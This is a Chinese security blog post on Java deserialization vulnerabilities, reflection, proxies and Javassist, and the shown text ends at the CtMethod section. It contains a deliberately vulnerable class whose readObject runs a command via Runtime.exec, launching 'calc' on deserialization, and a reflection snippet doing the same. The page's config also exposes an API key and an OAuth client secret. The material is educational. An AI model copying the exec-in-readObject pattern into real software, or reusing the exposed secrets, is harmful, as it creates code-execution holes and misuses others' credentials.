<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="java安全基础"><meta name="keywords" content="web安全,java反序列化"><meta name="author" content="ye1s,undefined"><meta name="copyright" content="ye1s"><title>java安全基础【ye1s】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"LKL6Q0GQJM","apiKey":"03829f64e2f5c11e4a5e2b8e51e24eb9","indexName":"blog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: {"owner":"ye1sec","repo":"comments","client_id":"d5ece338867af32b6dfa","client_secret":"2caf36bbd47977524017f95105315fc9e65f0577"},
}</script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="ye1s" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#基础概念"><span class="toc-number">1.</span> <span class="toc-text">基础概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#API实现"><span class="toc-number">2.</span> <span class="toc-text">API实现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#java反射"><span class="toc-number">3.</span> <span class="toc-text">java反射</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JAVA-代理机制"><span class="toc-number">4.</span> <span class="toc-text">JAVA 代理机制</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JAVASSIST"><span class="toc-number">5.</span> <span class="toc-text">JAVASSIST</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JAVA-RMI"><span class="toc-number">6.</span> <span class="toc-text">JAVA RMI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JAVA-JNDI注入"><span class="toc-number">7.</span> <span class="toc-text">JAVA JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JDK-lt-8u191"><span class="toc-number">7.1.</span> <span class="toc-text">JDK &lt; 8u191</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JDK-gt-8u191"><span class="toc-number">7.2.</span> <span class="toc-text">JDK &gt;8u191</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNI字段描述符"><span class="toc-number">8.</span> <span class="toc-text">JNI字段描述符</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SOAP"><span class="toc-number">9.</span> <span class="toc-text">SOAP</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">ye1s</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/ye1sec" target="_blank">GitHub<i class="icon-dot bg-color0"></i></a><a class="links-button button-hover" href="mailto:431774437@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color0"></i></a><a class="links-button button-hover" href="tencent://message/?uin=431774437&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color1"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">200</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">149</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">12</span></a></div><div class="friend-link"><a class="friend-link-text" href="http://www.m00nback.xyz/" target="_blank">MoonBack</a><a class="friend-link-text" target="_blank">待定</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">ye1s</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">java安全基础</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2020-05-31 | 更新于 2021-04-13</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a><span>&nbsp;|&nbsp;</span><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a></div></div></div><div class="main-content"><p>java反序列化漏洞是java中比较常见的漏洞。</p>
<a id="more"></a>
<h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h1><p><strong>定义</strong>       </p>
<p>序列化就是把对象的状态信息转换为字节序列(即可以存储或传输的形式)过程。<br>反序列化即逆过程，由字节流还原成对象。<br>注： 字节序是指多字节数据在计算机内存中存储或者网络传输时各字节的存储顺序。</p>
<p><strong>用途</strong>     </p>
<p>1） 把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中<br>2） 在网络上传送对象的字节序列       </p>
<p><strong>应用场景</strong><br>1)一般来说，服务器启动后，就不会再关闭了，但是如果逼不得已需要重启，而用户会话还在进行相应的操作，这时就需要使用序列化将session信息保存起来放在硬盘，服务器重启后，又重新加载。这样就保证了用户信息不会丢失，实现永久化保存。<br>2)在很多应用中，需要对某些对象进行序列化，让它们离开内存空间，入住物理硬盘，以便减轻内存压力或便于长期保存。 </p>
<p><strong>漏洞原由</strong>  </p>
<p>如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。    </p>
<h1 id="API实现"><a href="#API实现" class="headerlink" title="API实现"></a>API实现</h1><table>
<thead>
<tr>
<th>操作</th>
<th>类名</th>
<th>方法</th>
<th>方法作用</th>
</tr>
</thead>
<tbody><tr>
<td>序列化</td>
<td>Java.io.ObjectOutputStream</td>
<td>writeObject()</td>
<td>该方法对参数指定的obj对象进行序列化，把字节序列写到一个目标输出流中</td>
</tr>
<tr>
<td>反序列化</td>
<td>java.io.ObjectInputStream</td>
<td>readObject()</td>
<td>该方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。</td>
</tr>
</tbody></table>
<p>注意：实现Serializable和Externalizable接口的类的对象才能被序列化   </p>
<p>反序列化漏洞利用例子：<br>readObject()方法被重写的的话，反序列化该类时调用便是重写后的readObject()方法。如果该方法书写不当的话就有可能引发恶意代码的执行。   </p>
<p>Ye1s类   </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Ye1s</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream stream)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        stream.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getCmd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Main</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Ye1s ye1s=<span class="keyword">new</span> Ye1s();</span><br><span class="line">        ye1s.setCmd(<span class="string">"calc"</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] serializeData=serialize(ye1s);</span><br><span class="line">        System.out.println(serializeData);</span><br><span class="line">        unserilize(serializeData);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream btout=<span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut=<span class="keyword">new</span> ObjectOutputStream(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserilize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ByteArrayInputStream bthin=<span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn=<span class="keyword">new</span> ObjectInputStream(bthin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="java反射"><a href="#java反射" class="headerlink" title="java反射"></a>java反射</h1><p>Java反射(Reflection)是Java非常重要的动态特性，通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。Java反射机制是Java语言的动态性的重要体现，也是Java的各种框架底层实现的灵魂。    </p>
<p>其实在Java中定义的一个类本身也是一个对象，即java.lang.Class类的实例，这个实例称为类对象</p>
<ul>
<li>类对象表示正在运行的 Java 应用程序中的类和接口</li>
<li>类对象没有公共构造方法，由 Java 虚拟机自动构造</li>
<li>类对象用于提供类本身的信息，比如有几种构造方法， 有多少属性，有哪些普通方法  </li>
</ul>
<p><strong>获取类对象</strong><br>假设现在有一个User类   </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要获取该类对象一般有三种方法  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class.forName("reflection.User")</span><br><span class="line">User<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">new</span> <span class="title">User</span>().<span class="title">getClass</span>()</span></span><br></pre></td></tr></table></figure>
<p>最常用的是第一种，通过一个字符串即类的全路径名就可以得到类对象，另外两种方法依赖项太强       </p>
<p><strong>利用类对象创建对象</strong><br>与new直接创建对象不同，反射是先拿到类对象，然后通过类对象获取构造器对象，再通过构造器对象创建一个对象。   </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor; </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CreateObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class UserClass=Class.forName(<span class="string">"reflection.User"</span>);</span><br><span class="line">        Constructor constructor=UserClass.getConstructor(String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        User user=(User) constructor.newInstance(<span class="string">"ye1s"</span>);</span><br><span class="line">        System.out.println(user.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>getConstructor(Class…&lt;?&gt; parameterTypes)</td>
<td>获得该类中与参数类型匹配的公有构造方法</td>
</tr>
<tr>
<td>getConstructors()</td>
<td>获得该类的所有公有构造方法</td>
</tr>
<tr>
<td>getDeclaredConstructor(Class…&lt;?&gt; parameterTypes)</td>
<td>获得该类中与参数类型匹配的构造方法</td>
</tr>
<tr>
<td>getDeclaredConstructors()</td>
<td>获得该类所有构造方法</td>
</tr>
</tbody></table>
<p><strong>通过反射调用方法</strong>  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CallMethod</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class UserClass=Class.forName(<span class="string">"reflection.User"</span>);</span><br><span class="line">        Constructor constructor=UserClass.getConstructor(String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        User user=(User)constructor.newInstance(<span class="string">"ye1s"</span>);</span><br><span class="line"></span><br><span class="line">        Method method=UserClass.getMethod(<span class="string">"setName"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        method.invoke(user,<span class="string">"yesi"</span>);</span><br><span class="line">        System.out.println(user.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>getMethod(String name, Class…&lt;?&gt; parameterTypes)</td>
<td>获得该类某个公有的方法</td>
</tr>
<tr>
<td>getMethods()</td>
<td>获得该类所有公有的方法</td>
</tr>
<tr>
<td>getDeclaredMethod(String name, Class…&lt;?&gt; parameterTypes)</td>
<td>获得该类某个方法</td>
</tr>
<tr>
<td>getDeclaredMethods()</td>
<td>获得该类所有方法</td>
</tr>
</tbody></table>
<p><strong>通过反射访问属性</strong> </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccessAttribute</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception  </span>&#123;</span><br><span class="line">        Class UserClass=Class.forName(<span class="string">"reflection.User"</span>);</span><br><span class="line">        Constructor constructor=UserClass.getConstructor(String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        User user=(User)constructor.newInstance(<span class="string">"ye1s"</span>);</span><br><span class="line">        Field field=UserClass.getDeclaredField(<span class="string">"name"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);<span class="comment">// name是私有属性，需要先设置可访问</span></span><br><span class="line">        field.set(user,<span class="string">"yesi"</span>);</span><br><span class="line">        System.out.println(user.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>getField(String name)</td>
<td>获得某个公有的属性对象</td>
</tr>
<tr>
<td>getFields()</td>
<td>获得所有公有的属性对象</td>
</tr>
<tr>
<td>getDeclaredField(String name)</td>
<td>获得某个属性对</td>
</tr>
<tr>
<td>getDeclaredFields()</td>
<td>获得所有属性对象</td>
</tr>
</tbody></table>
<p><strong>利用java反射执行代码</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exec</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class runtimeClass=Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">        Object runtime=runtimeClass.getMethod(<span class="string">"getRuntime"</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line">        runtimeClass.getMethod("exec",String.class).invoke(runtime,"calc.exe");</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="JAVA-代理机制"><a href="#JAVA-代理机制" class="headerlink" title="JAVA 代理机制"></a>JAVA 代理机制</h1><p>详情可看此文章：<a href="https://xz.aliyun.com/t/9197" target="_blank" rel="noopener">https://xz.aliyun.com/t/9197</a>     </p>
<p>代理模式Java当中最常用的设计模式之一。其特征是代理类与委托类有同样的接口，代理类主要负责为委托类预处理消息、过滤消息、把消息转发给委托类，以及事后处理消息等。而Java的代理机制分为静态代理和动态代理。 动态代理又分为jdk动态代理和CGLIB动态代理。   </p>
<p>Java动态代理位于Java.lang.reflect包下，我们一般就仅涉及Java.lang.reflect.Proxy类与InvocationHandler接口,使用其配合反射，完成实现动态代理的操作。</p>
<p>InvocationHandler接口：负责提供调用代理操作。</p>
<p>是由代理对象调用处理器实现的接口，定义了一个invoke()方法，每个代理对象都有一个关联的接口。当代理对象上调用方法时，该方法会被自动转发到InvocationHandler.invoke()方法来进行调用。<br>Proxy类：负责动态构建代理类</p>
<p>提供四个静态方法来为一组接口动态生成的代理类并返回代理类的实例对象。  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getProxyClass(ClassLoader,Class&lt;?&gt;...)：获取指定类加载器和动态代理类对象。   </span><br><span class="line"></span><br><span class="line">newProxyInstance(ClassLoader,Class&lt;?&gt;[],InvocationHandler)：指定类加载器，一组接口，调用处理器；   </span><br><span class="line"></span><br><span class="line">isProxyClass(Class&lt;?&gt;)：判断获取的类是否为一个动态代理类;   </span><br><span class="line"></span><br><span class="line">getInvocationHandler(Object)：获取指定代理类实例查找与它相关联的调用处理器实例;</span><br></pre></td></tr></table></figure>
<h1 id="JAVASSIST"><a href="#JAVASSIST" class="headerlink" title="JAVASSIST"></a>JAVASSIST</h1><p>Javassist 是一个开源的分析、编辑和创建Java字节码的类库。其主要的优点，在于简单，而且快速。直接使用 java 编码的形式，而不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。  </p>
<p>ClassPool：一个基于 Hashtable 实现的 CtClass 对象容器，其中键是类名称，值是表示该类的 CtClass 对象。<br>CtClass：CtClass 表示类，一个 CtClass (编译时类）对象可以处理一个 class 文件，这些 CtClass 对象可以从 ClassPool 获得。<br>CtMethods：表示类中的方法。<br>CtFields ：表示类中的字段。 </p>
<p>ClassPool<br>获取 classpool 对象</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 获取 ClassPool 对象，使用系统默认类路径</span><br><span class="line">ClassPool pool = new ClassPool(<span class="literal">true</span>);</span><br><span class="line">// 效果与 new ClassPool(<span class="literal">true</span>) 一致</span><br><span class="line">ClassPool pool1 = ClassPool.getDefault();</span><br></pre></td></tr></table></figure>
<p>获取类</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 通过类名获取 CtClass，未找到会抛出异常</span><br><span class="line">CtClass ctClass = pool.get(<span class="string">"org.test.demo.DemoService"</span>);</span><br><span class="line">// 通过类名获取 CtClass，未找到返回 null，不会抛出异常</span><br><span class="line">CtClass ctClass1 = pool.getOrNull(<span class="string">"org.test.demo.DemoService"</span>);</span><br></pre></td></tr></table></figure>
<p>创建类</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 复制一个类，创建一个新类</span><br><span class="line">CtClass ctClass2 = pool.getAndRename(<span class="string">"org.test.demo.DemoService"</span>, <span class="string">"org.test.demo.DemoCopyService"</span>);</span><br><span class="line">// 通过类名，创建一个新类</span><br><span class="line">CtClass ctClass3 = pool.makeClass(<span class="string">"org.test.demo.NewDemoService"</span>);</span><br><span class="line">// 通过文件流，创建一个新类，注意文件必须是编译后的 class 文件，不是源代码文件。</span><br><span class="line">CtClass ctClass4 = pool.makeClass(new FileInputStream(new File(<span class="string">"./customize/DemoBeforeHandler.class"</span>)));</span><br></pre></td></tr></table></figure>
<p>添加类搜索路径</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// 将类搜索路径插入到搜索路径之前</span><br><span class="line">pool.insertClassPath(new ClassClassPath(this.getClass()));</span><br><span class="line">// 将类搜索路径添加到搜索路径之后</span><br><span class="line">pool.appendClassPath(new ClassClassPath(this.getClass()));</span><br><span class="line">// 将一个目录作为类搜索路径</span><br><span class="line">pool.insertClassPath(<span class="string">"/usr/local/javalib"</span>);</span><br><span class="line">CtClass</span><br><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    ClassPool pool = ClassPool.getDefault();</span><br><span class="line">    CtClass ctClass = pool.get(<span class="string">"javassist.test02.Person"</span>);</span><br><span class="line">    //类名</span><br><span class="line">    String name = ctClass.getName();</span><br><span class="line">    //包名</span><br><span class="line">    String packageName = ctClass.getPackageName();</span><br><span class="line">    //父类</span><br><span class="line">    CtClass superclass = ctClass.getSuperclass();</span><br><span class="line">    //接口</span><br><span class="line">    CtClass[] interfaces = ctClass.getInterfaces();</span><br><span class="line"></span><br><span class="line">    System.out.println(name);</span><br><span class="line">    System.out.println(packageName);</span><br><span class="line">    System.out.println(superclass.getName());</span><br><span class="line">    System.out.println(interfaces[0].getName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>CtMethod</p>
